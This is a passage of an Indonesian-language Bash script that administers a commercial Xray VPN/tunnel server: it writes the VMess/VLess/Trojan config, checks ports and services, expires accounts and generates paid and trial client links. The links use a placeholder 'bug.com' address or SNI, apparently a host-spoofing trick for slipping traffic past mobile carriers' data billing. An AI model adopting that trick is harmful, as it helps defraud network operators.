    printf "  ${WHITE}%-16s${NC}: ${CYAN}%s${NC}\n"  "Download"   "${dl:-N/A}"



    printf "  ${WHITE}%-16s${NC}: ${CYAN}%s${NC}\n"  "Upload"     "${ul:-N/A}"



    [[ -n "$url" ]] && printf "  ${WHITE}%-16s${NC}: ${BLUE}%s${NC}\n" "Result URL" "$url"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# FIX XRAY PERMISSIONS



#================================================







fix_xray_permissions() {



    mkdir -p /usr/local/etc/xray /var/log/xray



    chmod 755 /usr/local/etc/xray



    chmod 755 /var/log/xray



    touch /var/log/xray/access.log /var/log/xray/error.log



    chmod 644 /var/log/xray/access.log /var/log/xray/error.log



    chmod 644 /usr/local/etc/xray/config.json 2>/dev/null



    chown -R nobody:nogroup /var/log/xray 2>/dev/null



}







#================================================



# CREATE XRAY CONFIG



# TLS:    443 (via Nginx direct SSL)



# NonTLS: 80  (via Nginx  → 8080)



# gRPC:   443 (via HAProxy → 8444, H2 detect)



#================================================







create_xray_config() {



    mkdir -p /var/log/xray /usr/local/etc/xray



    cat > "$XRAY_CONFIG" << 'XRAYEOF'



{



  "log": {



    "access": "/var/log/xray/access.log",



    "error": "/var/log/xray/error.log",



    "loglevel": "warning"



  },



  "inbounds": [



    {



      "port": 8080,



      "protocol": "vmess",



      "settings": {"clients": []},



      "streamSettings": {



        "network": "ws",



        "wsSettings": {"path": "/vmess","headers": {}}



      },



      "sniffing": {"enabled": true,"destOverride": ["http","tls"]},



      "tag": "vmess-ws"



    },



    {



      "port": 8081,



      "protocol": "vless",



      "settings": {"clients": [],"decryption": "none"},



      "streamSettings": {



        "network": "ws",



        "wsSettings": {"path": "/vless","headers": {}}



      },



      "sniffing": {"enabled": true,"destOverride": ["http","tls"]},



      "tag": "vless-ws"



    },



    {



      "port": 8082,



      "protocol": "trojan",



      "settings": {"clients": []},



      "streamSettings": {



        "network": "ws",



        "wsSettings": {"path": "/trojan","headers": {}}



      },



      "sniffing": {"enabled": true,"destOverride": ["http","tls"]},



      "tag": "trojan-ws"



    },



    {



      "port": 8444,



      "protocol": "vmess",



      "settings": {"clients": []},



      "streamSettings": {



        "network": "grpc",



        "grpcSettings": {"serviceName": "vmess-grpc"}



      },



      "tag": "vmess-grpc"



    },



    {



      "port": 8445,



      "protocol": "vless",



      "settings": {"clients": [],"decryption": "none"},



      "streamSettings": {



        "network": "grpc",



        "grpcSettings": {"serviceName": "vless-grpc"}



      },



      "tag": "vless-grpc"



    },



    {



      "port": 8446,



      "protocol": "trojan",



      "settings": {"clients": []},



      "streamSettings": {



        "network": "grpc",



        "grpcSettings": {"serviceName": "trojan-grpc"}



      },



      "tag": "trojan-grpc"



    }



  ],



  "outbounds": [



    {"protocol": "freedom","settings": {"domainStrategy": "UseIPv4"},"tag": "direct"},



    {"protocol": "blackhole","settings": {},"tag": "block"}



  ],



  "routing": {



    "domainStrategy": "IPIfNonMatch",



    "rules": [{"type": "field","ip": ["geoip:private"],"outboundTag": "block"}]



  }



}



XRAYEOF



    fix_xray_permissions



}







#================================================



# INFO PORT



#================================================







show_info_port() {



    clear



    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}SERVER PORT INFORMATION${NC}"



    _box_divider $W



    _box_row $W "SSH OpenSSH"       "Port: 22"



    _box_row $W "SSH Dropbear"      "Port: 222"



    _box_row $W "Nginx TLS"         "Port: 443 (SSL direct)"



    _box_row $W "Nginx NonTLS"      "Port: 80"



    _box_row $W "Nginx Download"    "Port: 81"



    _box_row $W "Xray VMess WS"     "Port internal: 8080"



    _box_row $W "Xray VLess WS"     "Port internal: 8081"



    _box_row $W "Xray Trojan WS"    "Port internal: 8082"



    _box_row $W "Xray VMess gRPC"   "Port internal: 8444"



    _box_row $W "Xray VLess gRPC"   "Port internal: 8445"



    _box_row $W "Xray Trojan gRPC"  "Port internal: 8446"



    _box_row $W "BadVPN UDP"        "Port: 7100-7300"



    _box_row $W "ZI VPN UDP"        "Port: 7400-7500"



    _box_bottom $W



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







#================================================



# PING CHECK - CEK SEMUA PROTOCOL



#================================================







ping_check() {



    clear



    local W; W=$(get_width)



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    local ip_vps; ip_vps=$(get_ip)







    local ssh_svc_name; ssh_svc_name=$(get_ssh_service_name)



    _port_listening() { ss -tlnp 2>/dev/null | awk '{print $4}' | grep -qE ":${1}$"; }



    _svc_up()         { systemctl is-active --quiet "$1" 2>/dev/null; }



    _nc_local()       { nc -z -w 1 127.0.0.1 "$1" 2>/dev/null; }



    _prow() {



        local label="$1" port="$2" ok="$3"



        local W2; W2=$(get_width)



        if [ "$ok" = "0" ]; then



            printf "  %-38s ${GREEN}● ONLINE${NC}\n" "$label (port $port)"



        else



            printf "  %-38s ${RED}○ OFFLINE${NC}\n" "$label (port $port)"



        fi



    }







    _box_top $W



    _box_center $W "${YELLOW}${BOLD}PING CHECK ALL PROTOCOL${NC}"



    _box_divider $W



    _box_left $W "Domain : ${GREEN}${DOMAIN:-N/A}${NC}"



    _box_left $W "IP VPS : ${GREEN}${ip_vps}${NC}"



    _box_divider $W



    _box_center $W "${WHITE}SSH & DROPBEAR${NC}"



    _box_divider $W



    _nc_local 22  && _prow "SSH OpenSSH"  "22"  "0" || _prow "SSH OpenSSH"  "22"  "1"



    _nc_local 222 && _prow "SSH Dropbear" "222" "0" || _prow "SSH Dropbear" "222" "1"



    _box_divider $W



    _box_center $W "${WHITE}TLS PORT 443${NC}"



    _box_divider $W



    if _svc_up nginx && _port_listening 443; then



        _port_listening 8080 && _prow "VMess WS TLS"   "443" "0" || _prow "VMess WS TLS"   "443" "1"



        _port_listening 8081 && _prow "VLess WS TLS"   "443" "0" || _prow "VLess WS TLS"   "443" "1"



        _port_listening 8082 && _prow "Trojan WS TLS"  "443" "0" || _prow "Trojan WS TLS"  "443" "1"



        _port_listening 8444 && _prow "VMess gRPC TLS" "443" "0" || _prow "VMess gRPC TLS" "443" "1"



        _port_listening 8445 && _prow "VLess gRPC TLS" "443" "0" || _prow "VLess gRPC TLS" "443" "1"



        _port_listening 8446 && _prow "Trojan gRPC"    "443" "0" || _prow "Trojan gRPC"    "443" "1"



    else



        _prow "Nginx SSL"  "443" "1"



    fi



    _box_divider $W



    _box_center $W "${WHITE}NO-TLS PORT 80${NC}"



    _box_divider $W



    if _svc_up nginx && _port_listening 80; then



        _port_listening 8080 && _prow "VMess WS NonTLS"  "80" "0" || _prow "VMess WS NonTLS"  "80" "1"



        _port_listening 8081 && _prow "VLess WS NonTLS"  "80" "0" || _prow "VLess WS NonTLS"  "80" "1"



        _port_listening 8082 && _prow "Trojan WS NonTLS" "80" "0" || _prow "Trojan WS NonTLS" "80" "1"



    else



        _prow "Nginx HTTP" "80" "1"



    fi



    _box_divider $W



    _box_center $W "${WHITE}SERVICE STATUS${NC}"



    _box_divider $W



    _box_row $W "XRAY:     $( _svc_up xray      && echo '● ONLINE' || echo '○ OFFLINE')" \
               "NGINX:    $( _svc_up nginx     && echo '● ONLINE' || echo '○ OFFLINE')"



    _box_row $W "DROPBEAR: $( _svc_up dropbear  && echo '● ONLINE' || echo '○ OFFLINE')" \
               "HAPROXY:  $( _svc_up haproxy   && echo '● ONLINE' || echo '○ OFFLINE')"



    _box_row $W "SSH:      $( _svc_up "$ssh_svc_name" && echo '● ONLINE' || echo '○ OFFLINE')" \
               "UDP CUST: $( _svc_up udp-custom && echo '● ONLINE' || echo '○ OFFLINE')"



    _box_bottom $W



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







#================================================



# CEK EXPIRED



#================================================







cek_expired() {



    clear



    print_menu_header "CEK EXPIRED ACCOUNTS"



    local today found=0



    today=$(date +%s)



    shopt -s nullglob



    for f in "$AKUN_DIR"/*.txt; do



        [[ ! -f "$f" ]] && continue



        local exp_str exp_ts uname diff



        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)



        [[ -z "$exp_str" ]] && continue



        exp_ts=$(parse_exp_ts "$exp_str")



        [[ -z "$exp_ts" ]] && continue



        uname=$(basename "$f" .txt)



        diff=$(( (exp_ts - today) / 86400 ))



        if [[ $diff -le 3 ]]; then



            found=1



            if [[ $diff -lt 0 ]]; then



                echo -e "  ${RED}✘ EXPIRED${NC}: $uname"



                echo -e "    ${YELLOW}($exp_str)${NC}"



            else



                echo -e "  ${YELLOW}⚠ ${diff} hari${NC}: $uname"



                echo -e "    ${CYAN}($exp_str)${NC}"



            fi



        fi



    done



    shopt -u nullglob



    [[ $found -eq 0 ]] && echo -e "  ${GREEN}✔ Tidak ada akun expired!${NC}"



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# ROBUST DATE PARSER + DELETE EXPIRED



#================================================







# parse_exp_ts: parse tanggal format "dd Mmm, YYYY HH:MM" atau "dd Mmm YYYY"



parse_exp_ts() {



    local s="${1//,/}"   # hapus koma



    local ts



    # Coba parse langsung (date -d cukup pintar)



    ts=$(date -d "$s" +%s 2>/dev/null)



    [[ -n "$ts" ]] && echo "$ts" && return



    # Coba ganti nama bulan singkat ke angka manual



    s=$(echo "$s" | sed '



        s/Jan/01/; s/Feb/02/; s/Mar/03/; s/Apr/04/;



        s/May/05/; s/Jun/06/; s/Jul/07/; s/Aug/08/;



        s/Sep/09/; s/Oct/10/; s/Nov/11/; s/Dec/12/;



    ')



    ts=$(date -d "$s" +%s 2>/dev/null)



    [[ -n "$ts" ]] && echo "$ts" && return



    echo ""



}







delete_expired() {



    clear



    print_menu_header "DELETE EXPIRED ACCOUNTS"



    local today count=0



    today=$(date +%s)



    shopt -s nullglob



    for f in "$AKUN_DIR"/*.txt; do



        [[ ! -f "$f" ]] && continue



        local exp_str exp_ts fname uname protocol



        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)



        [[ -z "$exp_str" ]] && continue



        exp_ts=$(parse_exp_ts "$exp_str")



        [[ -z "$exp_ts" ]] && continue



        if [[ $exp_ts -lt $today ]]; then



            fname=$(basename "$f" .txt)



            protocol=${fname%%-*}



            uname=${fname#*-}



            echo -e "  ${RED}Deleting${NC}: $fname"



            local tmp; tmp=$(mktemp)



            jq --arg email "$uname"                'del(.inbounds[].settings.clients[]? | select(.email == $email))'                "$XRAY_CONFIG" > "$tmp" 2>/dev/null &&                mv "$tmp" "$XRAY_CONFIG" || rm -f "$tmp"



            [[ "$protocol" == "ssh" ]] && userdel -f "$uname" 2>/dev/null



            rm -f "$f"



            rm -f "$PUBLIC_HTML/${fname}.txt"



            rm -f "$PUBLIC_HTML/${fname}-clash.yaml"



            ((count++))



        fi



    done



    shopt -u nullglob



    if [[ $count -gt 0 ]]; then



        fix_xray_permissions



        if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then



            systemctl restart xray 2>/dev/null



        else



            echo -e "  ${RED}\u2718 Xray config error setelah delete!${NC}"



        fi



        echo ""



        echo -e "  ${GREEN}\u2714 Deleted ${count} accounts!${NC}"



    else



        echo -e "  ${GREEN}\u2714 Tidak ada akun expired!${NC}"



    fi



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# CREATE ACCOUNT TEMPLATE - XRAY



# TLS=443, NonTLS=80, gRPC=443



#================================================







create_account_template() {



    local protocol="$1" username="$2" days="$3" quota="$4" iplimit="$5"



    local uuid ip_vps exp created







    # Cek dependency sebelum mulai



    if ! command -v jq >/dev/null 2>&1; then



        echo -e "  ${RED}✘ jq tidak terinstall! Install dulu: apt install jq${NC}"



        sleep 2; return 1



    fi



    if ! command -v xray >/dev/null 2>&1; then



        echo -e "  ${RED}✘ Xray tidak terinstall! Jalankan instalasi dulu.${NC}"



        sleep 2; return 1



    fi



    if [[ ! -f "$XRAY_CONFIG" ]]; then



        echo -e "  ${RED}✘ Config Xray tidak ditemukan! Jalankan instalasi dulu.${NC}"



        sleep 2; return 1



    fi







    uuid=$(cat /proc/sys/kernel/random/uuid)



    ip_vps=$(get_ip)



    exp=$(date -d "+${days} days" +"%d %b, %Y")



    created=$(date +"%d %b, %Y")







    local temp; temp=$(mktemp)



    if [[ "$protocol" == "vmess" ]]; then



        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vmess")).settings.clients) += [{"id":$uuid,"email":$email,"alterId":0}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    elif [[ "$protocol" == "vless" ]]; then



        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vless")).settings.clients) += [{"id":$uuid,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    elif [[ "$protocol" == "trojan" ]]; then



        jq --arg password "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("trojan")).settings.clients) += [{"password":$password,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    fi







    if [[ $? -eq 0 ]] && [[ -s "$temp" ]]; then



        # Validasi JSON hasil sebelum replace



        if ! jq empty "$temp" 2>/dev/null; then



            rm -f "$temp"



            echo -e "  ${RED}✘ Config xray tidak valid (JSON error)!${NC}"



            sleep 2; return 1



        fi



        mv "$temp" "$XRAY_CONFIG"



        fix_xray_permissions



        # Validasi config xray sebelum restart



        if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then



            systemctl restart xray 2>/dev/null



            sleep 1



        else



            echo -e "  ${RED}✘ Xray config error setelah update!${NC}"



            xray -test -config "$XRAY_CONFIG" 2>&1 | head -5 | sed 's/^/    /'



            sleep 2; return 1



        fi



    else



        rm -f "$temp"



        echo -e "  ${RED}✘ Gagal update Xray! Pastikan jq dan Xray sudah terinstall dengan benar.${NC}"



        sleep 2; return 1



    fi







    mkdir -p "$AKUN_DIR"



    printf "UUID=%s\nQUOTA=%s\nIPLIMIT=%s\nEXPIRED=%s\nCREATED=%s\n" \
        "$uuid" "$quota" "$iplimit" "$exp" "$created" \
        > "$AKUN_DIR/${protocol}-${username}.txt"







    # === GENERATE LINKS ===



    # TLS=443, NonTLS=80, gRPC=443



    local link_tls link_nontls link_grpc



    if [[ "$protocol" == "vmess" ]]; then



        local j_tls j_nontls j_grpc



        j_tls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"443","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"tls"}' "$username" "$uuid" "$DOMAIN")



        link_tls="vmess://$(printf '%s' "$j_tls" | base64 -w 0)"



        j_nontls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"80","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"none"}' "$username" "$uuid" "$DOMAIN")



        link_nontls="vmess://$(printf '%s' "$j_nontls" | base64 -w 0)"



        j_grpc=$(printf '{"v":"2","ps":"%s","add":"%s","port":"443","id":"%s","aid":"0","net":"grpc","path":"vmess-grpc","type":"none","host":"bug.com","tls":"tls"}' "$username" "$DOMAIN" "$uuid")



        link_grpc="vmess://$(printf '%s' "$j_grpc" | base64 -w 0)"



    elif [[ "$protocol" == "vless" ]]; then



        link_tls="vless://${uuid}@bug.com:443?path=%2Fvless&security=tls&encryption=none&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"



        link_nontls="vless://${uuid}@bug.com:80?path=%2Fvless&security=none&encryption=none&host=${DOMAIN}&type=ws#${username}-NonTLS"



        link_grpc="vless://${uuid}@${DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName=vless-grpc&sni=bug.com#${username}-gRPC"



    elif [[ "$protocol" == "trojan" ]]; then



        link_tls="trojan://${uuid}@bug.com:443?path=%2Ftrojan&security=tls&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"



        link_nontls="trojan://${uuid}@bug.com:80?path=%2Ftrojan&security=none&host=${DOMAIN}&type=ws#${username}-NonTLS"



        link_grpc="trojan://${uuid}@${DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName=trojan-grpc&sni=bug.com#${username}-gRPC"



    fi







    mkdir -p "$PUBLIC_HTML"



    cat > "$PUBLIC_HTML/${protocol}-${username}.txt" << DLEOF



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



  YOUZIN CRABZ TUNEL - ${protocol^^} Account



  The Professor



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Username         : ${username}



 IP VPS           : ${ip_vps}



 Domain           : ${DOMAIN}



 UUID/Password    : ${uuid}



 Quota            : ${quota} GB



 IP Limit         : ${iplimit} IP



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Port TLS         : 443



 Port NonTLS      : 80



 Port gRPC        : 443



 Network          : WebSocket / gRPC



 Path WS          : /${protocol}



 ServiceName gRPC : ${protocol}-grpc



 TLS              : enabled



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Link TLS         :



 ${link_tls}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Link NonTLS      :



 ${link_nontls}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Link gRPC        :



 ${link_grpc}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Download         : http://${ip_vps}:81/${protocol}-${username}.txt



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



 Aktif Selama     : ${days} Hari



 Dibuat Pada      : ${created}



 Berakhir Pada    : ${exp}



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━



DLEOF







    _print_xray_result "$protocol" "$username" "$ip_vps" "$uuid" "$quota" "$iplimit" \
        "$link_tls" "$link_nontls" "$link_grpc" "$days" "$created" "$exp"







    local dl_link="http://${ip_vps}:81/${protocol}-${username}.txt"



    send_telegram_admin \
"✅ <b>New ${protocol^^} Account - Youzin Crabz Tunel</b>



━━━━━━━━━━━━━━━━━━━━━━━━━



👤 Username   : <code>${username}</code>



🔑 UUID       : <code>${uuid}</code>



🌐 Domain     : <code>${DOMAIN}</code>



🖥️ IP VPS     : <code>${ip_vps}</code>



📦 Protocol   : ${protocol^^}



📊 Quota      : ${quota} GB



🔒 IP Limit   : ${iplimit} IP



━━━━━━━━━━━━━━━━━━━━━━━━━



🔌 Port TLS   : 443



🔌 Port NonTLS: 80



🔌 Port gRPC  : 443



━━━━━━━━━━━━━━━━━━━━━━━━━



📅 Dibuat     : ${created}



⏳ Berakhir   : ${exp}



🔗 Download   : ${dl_link}



━━━━━━━━━━━━━━━━━━━━━━━━━



<i>Powered by The Professor</i>"







    read -rp "  Press any key to back..."



}







#================================================



# PRINT XRAY RESULT



#================================================







_print_xray_result() {



    local protocol="$1" username="$2" ip_vps="$3" uuid="$4"



    local quota="$5" iplimit="$6" link_tls="$7" link_nontls="$8"



    local link_grpc="$9" days="${10}" created="${11}" exp="${12}"



    clear



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo -e "  ${WHITE}${BOLD}YOUZIN CRABZ TUNEL${NC} — ${YELLOW}${protocol^^} Account${NC}"



    echo -e "  ${DIM}The Professor${NC}"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Username"    "$username"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "IP VPS"      "$ip_vps"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Domain"      "${DOMAIN:-}"



    printf "  ${WHITE}%-16s${NC} : ${CYAN}%s${NC}\n"  "UUID"        "$uuid"



    printf "  ${WHITE}%-16s${NC} : %s GB\n"            "Quota"       "$quota"



    printf "  ${WHITE}%-16s${NC} : %s IP\n"            "IP Limit"    "$iplimit"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port TLS"    "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port NonTLS" "80"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port gRPC"   "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Network"     "WebSocket / gRPC"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Path WS"     "/${protocol}"



    printf "  ${WHITE}%-16s${NC} : %s\n" "ServiceName" "${protocol}-grpc"



    printf "  ${WHITE}%-16s${NC} : %s\n" "TLS"         "enabled"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}%-16s${NC} :\n" "Link TLS";   echo "  $link_tls"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}%-16s${NC} :\n" "Link NonTLS"; echo "  $link_nontls"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}%-16s${NC} :\n" "Link gRPC";   echo "  $link_grpc"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : http://%s:81/%s-%s.txt\n" "Download" "$ip_vps" "$protocol" "$username"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${YELLOW}%s Hari${NC}\n" "Aktif Selama" "$days"



    printf "  ${WHITE}%-16s${NC} : %s\n"  "Dibuat"    "$created"



    printf "  ${WHITE}%-16s${NC} : ${RED}%s${NC}\n" "Berakhir"  "$exp"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo ""



}







#================================================



# TRIAL XRAY - TLS=443, NonTLS=80, gRPC=443



#================================================







create_trial_xray() {



    local protocol="$1"



    local username="trial-$(date +%H%M%S)"



    local uuid ip_vps exp created







    # Cek dependency sebelum mulai



    if ! command -v jq >/dev/null 2>&1; then



        echo -e "  ${RED}✘ jq tidak terinstall! Install dulu: apt install jq${NC}"



        sleep 2; return



    fi



    if ! command -v xray >/dev/null 2>&1; then



        echo -e "  ${RED}✘ Xray tidak terinstall! Jalankan instalasi dulu.${NC}"



        sleep 2; return



    fi



    if [[ ! -f "$XRAY_CONFIG" ]]; then



        echo -e "  ${RED}✘ Config Xray tidak ditemukan!${NC}"



        sleep 2; return



    fi







    uuid=$(cat /proc/sys/kernel/random/uuid)



    ip_vps=$(get_ip)



    exp=$(date -d "+1 hour" +"%d %b, %Y %H:%M")



    created=$(date +"%d %b, %Y %H:%M")







    local temp; temp=$(mktemp)



    if [[ "$protocol" == "vmess" ]]; then



        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vmess")).settings.clients) += [{"id":$uuid,"email":$email,"alterId":0}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    elif [[ "$protocol" == "vless" ]]; then



        jq --arg uuid "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("vless")).settings.clients) += [{"id":$uuid,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    elif [[ "$protocol" == "trojan" ]]; then



        jq --arg password "$uuid" --arg email "$username" \
           '(.inbounds[] | select(.tag | startswith("trojan")).settings.clients) += [{"password":$password,"email":$email}]' \
           "$XRAY_CONFIG" > "$temp" 2>/dev/null



    fi







    if [[ $? -eq 0 ]] && [[ -s "$temp" ]]; then



        mv "$temp" "$XRAY_CONFIG"; fix_xray_permissions; systemctl restart xray 2>/dev/null; sleep 1



    else



        rm -f "$temp"; echo -e "  ${RED}✘ Gagal! Pastikan jq dan Xray sudah terinstall.${NC}"; sleep 2; return



    fi







    mkdir -p "$AKUN_DIR"



    printf "UUID=%s\nQUOTA=1\nIPLIMIT=1\nEXPIRED=%s\nCREATED=%s\nTRIAL=1\n" \
        "$uuid" "$exp" "$created" > "$AKUN_DIR/${protocol}-${username}.txt"







    (



        sleep 3600



        # File locking untuk mencegah race condition



        exec 200>"$XRAY_LOCK_FILE"



        flock -w 10 200 || exit 1



        local tmp2; tmp2=$(mktemp)



        jq --arg email "$username" \
           'del(.inbounds[].settings.clients[]? | select(.email == $email))' \
           "$XRAY_CONFIG" > "$tmp2" 2>/dev/null && \
           mv "$tmp2" "$XRAY_CONFIG" || rm -f "$tmp2"



        fix_xray_permissions; systemctl restart xray 2>/dev/null



        rm -f "$AKUN_DIR/${protocol}-${username}.txt"



        rm -f "$PUBLIC_HTML/${protocol}-${username}.txt"



        flock -u 200



    ) &



    disown $!







    # Generate links: TLS=443, NonTLS=80, gRPC=443



    local link_tls link_nontls link_grpc



    if [[ "$protocol" == "vmess" ]]; then



        local j_tls j_nontls j_grpc



        j_tls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"443","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"tls"}' "$username" "$uuid" "$DOMAIN")



        link_tls="vmess://$(printf '%s' "$j_tls" | base64 -w 0)"



        j_nontls=$(printf '{"v":"2","ps":"%s","add":"bug.com","port":"80","id":"%s","aid":"0","net":"ws","path":"/vmess","type":"none","host":"%s","tls":"none"}' "$username" "$uuid" "$DOMAIN")



        link_nontls="vmess://$(printf '%s' "$j_nontls" | base64 -w 0)"



        j_grpc=$(printf '{"v":"2","ps":"%s","add":"%s","port":"443","id":"%s","aid":"0","net":"grpc","path":"vmess-grpc","type":"none","host":"bug.com","tls":"tls"}' "$username" "$DOMAIN" "$uuid")



        link_grpc="vmess://$(printf '%s' "$j_grpc" | base64 -w 0)"



    elif [[ "$protocol" == "vless" ]]; then



        link_tls="vless://${uuid}@bug.com:443?path=%2Fvless&security=tls&encryption=none&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"



        link_nontls="vless://${uuid}@bug.com:80?path=%2Fvless&security=none&encryption=none&host=${DOMAIN}&type=ws#${username}-NonTLS"



        link_grpc="vless://${uuid}@${DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName=vless-grpc&sni=bug.com#${username}-gRPC"



    elif [[ "$protocol" == "trojan" ]]; then



        link_tls="trojan://${uuid}@bug.com:443?path=%2Ftrojan&security=tls&host=${DOMAIN}&type=ws&sni=${DOMAIN}#${username}-TLS"



        link_nontls="trojan://${uuid}@bug.com:80?path=%2Ftrojan&security=none&host=${DOMAIN}&type=ws#${username}-NonTLS"



        link_grpc="trojan://${uuid}@${DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName=trojan-grpc&sni=bug.com#${username}-gRPC"



    fi







    clear



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo -e "  ${WHITE}${BOLD}YOUZIN CRABZ TUNEL${NC} — ${YELLOW}Trial ${protocol^^} (1 Jam)${NC}"



    echo -e "  ${DIM}The Professor${NC}"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Username" "$username"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "IP VPS"   "$ip_vps"



    printf "  ${WHITE}%-16s${NC} : ${GREEN}%s${NC}\n" "Domain"   "$DOMAIN"



    printf "  ${WHITE}%-16s${NC} : ${CYAN}%s${NC}\n"  "UUID"     "$uuid"



    printf "  ${WHITE}%-16s${NC} : 1 GB\n" "Quota"



    printf "  ${WHITE}%-16s${NC} : 1 IP\n" "IP Limit"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port TLS"    "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port NonTLS" "80"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Port gRPC"   "443"



    printf "  ${WHITE}%-16s${NC} : %s\n" "Path WS"     "/${protocol}"



    printf "  ${WHITE}%-16s${NC} : %s\n" "ServiceName" "${protocol}-grpc"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}Link TLS${NC} :\n  %s\n" "$link_tls"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${YELLOW}Link NonTLS${NC} :\n  %s\n" "$link_nontls"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



